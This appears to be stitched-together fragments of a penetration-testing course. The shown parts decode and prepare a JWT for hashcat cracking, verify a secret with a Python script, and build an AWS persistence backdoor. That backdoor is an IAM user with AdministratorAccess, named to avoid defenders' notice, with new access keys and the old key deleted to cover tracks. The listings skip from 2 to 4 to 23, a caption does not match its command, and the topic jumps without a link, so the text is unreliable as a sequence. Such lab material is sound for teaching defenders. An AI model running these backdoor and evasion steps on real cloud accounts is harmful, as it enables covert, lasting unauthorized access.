> Listing 1 - Extracting the JWT From Local Storage

The value looks like a base64-encoded string. However, there are three segments separated by a period. This usually means we're dealing with a _JSON Web Token_ (JWT).

Let's decode the body to analyze it.

```kali-shell
kali@kali:~$ echo -n "eyJpZCI6NywiZmlyc3RfbmFtZSI6IkxlYXJuZXIiLCJsYXN0X25hbWUiOiJMZWFybmVyIiwiZW1haWwiOiJsZWFybmVyQHRlc3QuaW50ZXJuYWwiLCJpc19wcmVtaXVtIjpudWxsLCJleHAiOjE3NDY1NTc5NzF9" | base64 -d
{"id":7,"first_name":"Learner","last_name":"Learner","email":"learner@test.internal","is_premium":null,"exp":1746557971}  
```

> Listing 2 - Decoding the JWT's Body

There are a few standard claims. However, there's one called _is_premium_ which might unlock additional privileges if it's set to _true_.

To modify any of the values, we would need to update the signature of the JWT which would require the secret key. We can try to crack the signature to get the secret key.

Let's try cracking the token with _hashcat_. We'll need to save the complete token to a file and download a wordlist that contains common JWT secrets.

```kali-shell
kali@kali:~$ echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywiZmlyc3RfbmFtZSI6IkxlYXJuZXIiLCJsYXN0X25hbWUiOiJMZWFybmVyIiwiZW1haWwiOiJsZWFybmVyQHRlc3QuaW50ZXJuYWwiLCJpc19wcmVtaXVtIjpudWxsLCJleHAiOjE3NDY1NTc5NzF9.pkZ4RJIDQAW9Zg3vBZrYUmhlwjAQPKZEF5o8-8KPaaw" > /tmp/jwt_to_crack.txt
```

> Listing 4 - Cracking the JWT

We can use tools such as [**https://jwt.is/**](https://jwt.is/) or [**CyberChef**](https://gchq.github.io/CyberChef/#recipe=JWT_Verify\('this-secret-strength-is-over-nine-thousand'\)&input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBaQ0k2Tnl3aVptbHljM1JmYm1GdFpTSTZJa3hsWVhKdVpYSWlMQ0pzWVhOMFgyNWhiV1VpT2lKTVpXRnlibVZ5SWl3aVpXMWhhV3dpT2lKc1pXRnlibVZ5UUhSbGMzUXVhVzUwWlhKdVlXd2lMQ0pwYzE5d2NtVnRhWFZ0SWpwdWRXeHNMQ0psZUhBaU9qRTNORFkxTmpVMk16WjkueWhhTWNzQjRLaXc3Vy1wd0lzS3puU2dnYS1VOVBpOURYTVIzaVM0U1JGcw) to verify the secret we found. In this case, we'll create a _Python_ script to check if the JWT's secret we obtained is the right one.

```kali-shell
kali@kali:~$ cat > verify_jwt.py << 'EOF'
import jwt
import sys

if len(sys.argv) != 3:
    print("Usage: python verify_jwt.py <token> <secret>")
    sys.exit(1)

token = sys.argv[1]
secret = sys.argv[2]

try:
    result = jwt.decode(token, secret, algorithms=['HS256'])
    print("Valid signature! Decoded payload:", result)
except jwt.exceptions.InvalidSignatureError:
    print("Invalid signature!")
except Exception as e:
    print(f"Error: {e}")
EOF
```

## 29.3.4. Persistence

Now that we have administrative access, we can ensure persistence in the AWS environment by creating a new user and attaching the [_AdministratorAccess_](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AdministratorAccess.html) policy. We'll use a generic name for this user so that it is less likely to stand out to defenders. We'll generate access keys for this new user so we can return later without depending on existing accounts. Finally, we'll delete the access key previously created for `admin-mason`.

```
kali@kali:~$ aws iam create-user --user-name cicd --profile admin-mason
{
    "User": {
        "Path": "/",
        "UserName": "cicd",
        "UserId": "AIDAZYKJVV3XHALSIP7D",
        "Arn": "arn:aws:iam::533267328750:user/cicd"
    }
}

kali@kali:~$ aws iam attach-user-policy --user-name cicd --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile admin-mason

kali@kali:~$ aws iam create-access-key --user-name cicd --profile admin-mason
{
    "AccessKey": {
        "UserName": "cicd",
        "Status": "Active",
        "SecretAccessKey": "Z1Yt9LkfDD9uNjN2LWk8uP3DnxKtEMvqKBO1nPHJ",
        "AccessKeyId": "AKIAZYKJVV3ZBACICDKEY"
    }
}

kali@kali:~$ aws iam delete-access-key --user-name admin-mason --access-key-id AKIARLO3TVYSG6LN3GFT --profile admin-mason
```

> Listing 23 - Creating a new user and access keys for persistence and cleaning up our tracks

With this new user and key pair, we now have a backdoor into the cloud account even if the original `admin-mason` keys are rotated or deleted.
